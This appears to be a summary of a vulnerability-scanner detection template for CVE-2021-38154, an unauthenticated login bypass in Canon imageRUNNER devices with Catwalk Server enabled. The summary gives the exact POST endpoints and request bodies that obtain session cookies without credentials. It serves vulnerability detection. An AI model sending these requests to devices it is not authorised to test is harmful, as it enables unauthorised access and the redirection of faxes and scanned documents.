---
cve_id: CVE-2021-38154
template_path: nuclei-templates/http/cves/2021/CVE-2021-38154.yaml
affected_product: Canon Devices
severity: high
authentication: none
external_callback: false
affected_versions: manufactured in 2012 through 2020
preconditions: Catwalk Server enabled for HTTP access and PIN not required for General User Mode
poc_classification: auth-bypass
---

## Vulnerability

Certain Canon devices manufactured in 2012 through 2020 (such as imageRUNNER ADVANCE iR-ADV C5250) with Catwalk Server enabled for HTTP access allow remote unauthenticated attackers to bypass authentication when no PIN is required for General User Mode. Attackers can modify the e-mail address setting, causing the device to send sensitive information (e.g., incoming FAX or scanned documents) to an attacker-controlled address. Exploited in the wild in August 2021.  
**CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)  
**CWE:** CWE-732  

## PoC / Detection
Classification: auth-bypass

The template executes a two-step unauthenticated HTTP flow to verify the bypass:  
- `POST /tryLogin.cgi` with body `loginM=&0000=0011&0002=` (matcher: status 303, location contains `/portal_top.html`, cookie contains `fusion-http-session-id=`).  
- `POST /checkLogin.cgi` with body `i0017=2&i0019=` (matcher: status 302, location contains `/portal_top.html`, cookie contains `sessid=`).  

Successful session-cookie issuance and redirects confirm the device accepts login without credentials or PIN.

## References
- https://protocolpolice.nl/CVE-2021-38154_Protocol_Police_Catwalk_Alert
- https://www.usa.canon.com/internet/portal/us/home/support/product-advisories
- https://nvd.nist.gov/vuln/detail/CVE-2021-38154
